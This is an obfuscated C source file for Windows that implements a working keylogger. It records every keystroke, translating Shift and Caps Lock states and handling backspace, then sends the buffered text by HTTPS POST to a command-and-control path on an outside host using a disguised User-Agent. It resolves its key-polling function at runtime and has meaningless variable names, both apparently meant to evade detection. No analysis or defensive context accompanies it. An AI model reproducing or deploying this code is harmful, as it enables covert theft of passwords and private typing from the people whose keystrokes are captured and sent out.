#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#define O1 1024
#define O2 2000

char V1[O1];
int V2 = 0;
CRITICAL_SECTION V3;
char* O3 = "tdsoperational.pythonanywhere.com";

typedef SHORT (WINAPI *F3)(int);
F3 O4;

void F1() {
    HINTERNET V4 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (V4) {
        HINTERNET V5 = InternetConnectA(V4, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (V5) {
            const char *O5 = "/c2/data";
            const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
            HINTERNET V6 = HttpOpenRequestA(V5, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (V6) {
                char V7[O1 + 128];
                sprintf(V7, "{\"content\":\"%s\"}", V1);
                if (HttpSendRequestA(V6, O6, -1, V7, strlen(V7))) {
                }
                InternetCloseHandle(V6);
            }
            InternetCloseHandle(V5);
        }
        InternetCloseHandle(V4);
    }

    EnterCriticalSection(&V3);
    V2 = 0;
    V1[0] = '\0';
    LeaveCriticalSection(&V3);
}

DWORD WINAPI F2(LPVOID O7) {
    DWORD V8 = GetTickCount();
    while (1) {
        for (int V9 = 8; V9 <= 255; V9++) {
            if (O4(V9) & 0x0001) {
                V8 = GetTickCount();

                char V10[2] = {0, 0};
                SHORT V11 = GetKeyState(VK_CAPITAL) & 0x0001;
                SHORT V12 = O4(VK_SHIFT) & 0x8000;

                if ((V9 >= 'A' && V9 <= 'Z')) {
                    if (V12 ^ V11) {
                        V10[0] = (char)V9;
                    } else {
                        V10[0] = (char)(V9 + 32);
                    }
                } else if (V9 >= '0' && V9 <= '9') {
                    if (V12) {
                        switch (V9) {
                            case '0': V10[0] = ')'; break;
                            case '1': V10[0] = '!'; break;
                            case '2': V10[0] = '@'; break;
                            case '3': V10[0] = '#'; break;
                            case '4': V10[0] = '$'; break;
                            case '5': V10[0] = '%'; break;
                            case '6': V10[0] = '^'; break;
                            case '7': V10[0] = '&'; break;
                            case '8': V10[0] = '*'; break;
                            case '9': V10[0] = '('; break;
                        }
                    } else {
                        V10[0] = (char)V9;
                    }
                } else {
                    switch (V9) {
                        case VK_SPACE: V10[0] = ' '; break;
                        case VK_RETURN: V10[0] = '\n'; break;
                        case VK_TAB: V10[0] = '\t'; break;
                        case VK_BACK:
                            EnterCriticalSection(&V3);
                            if (V2 > 0) {
                                V2--;
                                V1[V2] = '\0';
                            }
                            LeaveCriticalSection(&V3);
                            continue;
                        case VK_OEM_1: V10[0] = (V12) ? ':' : ';'; break;
                        case VK_OEM_PLUS: V10[0] = (V12) ? '+' : '='; break;
                        case VK_OEM_COMMA: V10[0] = (V12) ? '<' : ','; break;
                        case VK_OEM_MINUS: V10[0] = (V12) ? '_' : '-'; break;
                        case VK_OEM_PERIOD: V10[0] = (V12) ? '>' : '.'; break;
                        case VK_OEM_2: V10[0] = (V12) ? '?' : '/'; break;
                        case VK_OEM_3: V10[0] = (V12) ? '~' : '`'; break;
                        case VK_OEM_4: V10[0] = (V12) ? '{' : '['; break;
                        case VK_OEM_5: V10[0] = (V12) ? '|' : '\\'; break;
                        case VK_OEM_6: V10[0] = (V12) ? '}' : ']'; break;
                        case VK_OEM_7: V10[0] = (V12) ? '"' : '\''; break;
                        default: continue;
                    }
                }

                EnterCriticalSection(&V3);
                if (V2 + 1 < O1) {
                    strcat(V1, V10);
                    V2++;
                }
                LeaveCriticalSection(&V3);
            }
        }

        if (GetTickCount() - V8 >= O2) {
            if (V2 > 0) {
                F1();
            }
            V8 = GetTickCount();
        }

        Sleep(10);
    }
    return 0;
}

int wmain() {
    DWORD V13;
    HANDLE V14;

    O4 = (F3)GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "GetAsyncKeyState");

    InitializeCriticalSection(&V3);
    V14 = CreateThread(NULL, 0, F2, NULL, 0, &V13);
    WaitForSingleObject(V14, INFINITE);
    DeleteCriticalSection(&V3);
    CloseHandle(V14);
    return 0;
}
